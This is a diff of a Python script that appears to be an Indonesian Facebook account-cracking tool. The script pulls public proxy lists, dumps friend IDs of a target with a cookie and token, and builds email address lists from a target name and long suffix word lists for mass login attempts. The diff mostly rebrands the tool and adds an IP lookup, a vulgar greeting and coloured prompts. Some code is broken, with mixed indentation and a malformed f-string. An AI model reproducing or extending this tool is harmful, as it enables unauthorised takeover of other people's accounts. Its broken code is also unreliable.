@@ -66,7 +66,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKhoirul-Xd')
+	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
 prox=open('.prox.txt','r').read().splitlines()
 for ut in range(10000):
 	rr = random.randint
@@ -351,6 +351,10 @@ def login():
              [bold green]Status: [red]Premium
              [bold green]WhatsApp: [blue]081283547452
              [bold green]GitHub: [blue]https://github.com/khoirulez""",width=70, padding=(0, 7), style=f"{color_panel}"))
+    ip = requests.get("https://api.ipify.org").text
+	cetak(nel('\tSelamat Datang [green]%s[white] Ngentod'%(my_name)))
+	alvino_xy(f'{H} Your Idz{N} : '+str(my_id))
+	alvino_xy(f'{H} Your Ip{N}  : {ip}')
 	prints(nel(f'              {P2}[bold blue]Menu Tools Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	prints(nel(f"""{P2}{color_text}01{P2} [bold green]Crack Massal    {color_text}04{P2} [bold green]Cek Ressult
 {color_text}02{P2} [bold green]Crack Publik    {color_text}05{P2} [bold green]Crack File
@@ -360,7 +364,7 @@ def login():
 		massal()
 	elif ___Sllowly_ID____ in ['2']:
 		prints(nel(f'               {P2}{H}Publik Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
-		idt = input('✶ ━━⫸ {H} ID Target : ')
+		idt = input('✶ ━━⫸ {H} ID Target{N} : ')
 		dump(idt,"",{"Kue":cok},token)
 		setting()
 	elif ___Sllowly_ID____ in ['3']:
@@ -441,15 +445,15 @@ def mail2():
 	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
 	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
 	global ok , cc
-	nama = input(f'{P}[{H}?{P}]} nama target : ')
+	nama = input(f'{P}[{H}?{P}]}{U} nama target{N} : ')
 	if ',' in str(nama):
 		print(f' {P}└─{J} {M} masukan nama, jangan kosong ')
 		time.sleep(3);exit()
-	doma = input(f'{P}[{H}?{P}] domain (ex:@gmail.com) : ')
+	doma = input(f'{P}[{H}?{P}]{U} domain (ex:@gmail.com){N} : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
 		print(f' {P}└─{J}{M} masukkan domain dengan benar ')
 		time.sleep(3);exit()
-	jumlah = input(f'{P}[{H}?{P}]total dump (max:10000) : ')
+	jumlah = input(f'{P}[{H}?{P}]{U}total dump (max:10000){N} : ')
 	for xyz in range(int(jumlah)):
 		AA = nama
 		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
